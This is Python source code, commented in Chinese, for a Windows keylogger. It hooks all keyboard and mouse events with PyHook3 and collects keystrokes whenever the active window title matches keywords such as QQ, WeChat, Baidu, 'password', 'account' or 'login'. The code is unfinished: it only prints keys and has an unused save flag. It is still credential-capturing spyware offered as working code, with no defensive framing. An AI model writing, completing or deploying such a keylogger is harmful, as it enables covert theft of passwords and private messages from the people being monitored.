import pythoncom 
import PyHook3

lists=['百度','QQ','哔哩哔哩','微博','微信','密码','password','账号','account','login','kali linux']
msg=""
save_to=1

def onMouseEvent(event): 
    global lists
    global msg
    #print( "MessageName:",event.MessageName)     
    #print("---")
    # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了     

    return True
    
  
def onKeyboardEvent(event):
    #--------------判断用户目前在操作的界面开头是否包含关键词算法---------------
    global msg
    global lists

    keyid=event.Ascii
    keychar=chr(event.Ascii)
    keyword=event.Key
    title=event.WindowName

    words=''
    ks=''
    status=1
    title_word=''

    if len(title) >0:
        for n in range(len(lists)):
            if len(title) >=len(lists[n]):
                for tw in title:
                    words+=tw
                    if words ==lists[n]:
                        break    
                    elif len(words) >len(lists[n]):
                        words=''
                        break
                if len(words) >0:
                    if 127 > keyid >32:
                        ks+=keyword
                    elif keyid==13 or keyid==8 or keyid ==127 or keyid ==32:    
                        ks+=keychar
    print(keychar)
    print(keyid)
    #-----------------------------------------------------------------------
    print( "---"      )
    # 同鼠标事件监听函数的返回值     
    return True 
 
def main():     
    # 创建一个“钩子”管理对象     
    hm = PyHook3.HookManager()      
    # 监听所有键盘事件钩子 
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()      
    # 监听所有鼠标事件钩子 
    hm.MouseAll = onMouseEvent     
    hm.HookMouse()      
    # 进入循环，如不手动关闭，程序将一直处于监听状态     
    pythoncom.PumpMessages() 

 
if __name__ == "__main__":     
    main()

